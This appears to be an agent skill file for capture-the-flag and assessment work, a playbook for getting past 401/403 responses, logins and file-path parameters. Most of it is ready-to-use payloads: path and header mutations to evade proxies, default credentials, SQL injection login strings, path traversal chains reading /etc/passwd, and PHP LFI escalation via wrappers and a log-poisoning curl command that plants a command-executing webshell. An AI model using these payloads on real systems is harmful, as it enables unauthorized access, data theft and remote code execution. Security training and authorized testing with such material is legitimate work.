name: access-control-bypass
description: Access-control and path bypass playbook — defeat 401/403 forbidden responses via path/encoding manipulation, bypass login via default creds + SQLi + reset flaws, and turn a file-read/path-traversal primitive into flag read (or RCE via LFI + log poisoning). Use when you hit a forbidden/admin wall or a file/include parameter.
---

# Access Control & Path Bypass

Authorized CTF/assessment use. Three skills that keep coming up together: beating a 401/403 wall, beating the login itself, and abusing a file path. The flag is almost always behind one of these three.

## 1. 401/403 bypass (forbidden → allowed)

The proxy/WAF checks one path form; the backend normalizes differently. Mutate the PATH:

```
/admin          → 403
/admin/         → 200   (trailing slash)
/admin/.        → 200   (trailing dot)
/Admin  /ADMIN  → 200   (case — proxy case-sensitive, backend not)
/%61dmin        → 200   (URL-encode a char)
/%2561dmin      → 200   (double encode)
/admi%C0%AE     → 200   (overlong UTF-8)
/admin%00       → 200   (null byte)
/admin;/  /admin;foo=bar → 200  (Tomcat path parameter)
/./admin  //admin  /admin/./  → 200  (dot-segment)
```
Also mutate the REQUEST: `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, `X-Forwarded-For: 127.0.0.1`, method override (`X-HTTP-Method-Override: GET`), protocol downgrade (HTTP/1.0).

## 2. Authentication bypass

**Default creds first** (cheap, often wins): `admin:admin`, `admin:password`, `root:root`, product defaults (`tomcat:tomcat`, `weblogic:weblogic1`, `admin:123456`).

**SQLi login bypass:** `username=admin'--` (note the trailing space for MySQL `-- `), `admin' OR '1'='1`, `' OR 1=1#`.

**Logic flaws:** password-reset token predictable / not invalidated; response contains the reset token; MFA step skippable by hitting the post-MFA endpoint directly; `is_admin`/`role` field client-controlled.

## 3. Path traversal / LFI (read → maybe RCE)

**Traversal chains:**
```
../etc/passwd
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%2fpasswd   (double decode)
```

**The key move — read SOURCE to learn the base dir**, then count exact `../` depth. Don't guess one `../` at a time; the source (`download.php`/`index.php` itself) tells you the include base and flag path.

**PHP LFI → RCE** (when `include()`/`require()` runs the file as code):
- **Wrapper:** `php://filter/convert.base64-encode/resource=config.php` (read without executing), `data://text/plain,<?php system('id');?>`, `php://input` + POST code.
- **Log poisoning:** write PHP into a log you control (User-Agent → access.log), then include it:
  ```
  curl -A "<?php system(\$_GET[c]);?>" http://target/   → then ?page=/var/log/apache2/access.log&c=id
  ```
- **Session file / /proc/self/environ** as alternate code containers.

**Verify:** `/etc/passwd` comes back → read confirmed; then read source → flag; or wrapper/log-poison → RCE → flag.

## Cross-cutting
- **401/403 is a normalization fight** — exhaust the path/header mutations before giving up.
- **A file-read is a recon primitive** — the source/config it exposes is the real payload (flag path, secrets, base dir).
- Self-verify each bypass (200 vs 403, file content vs error) before escalating.
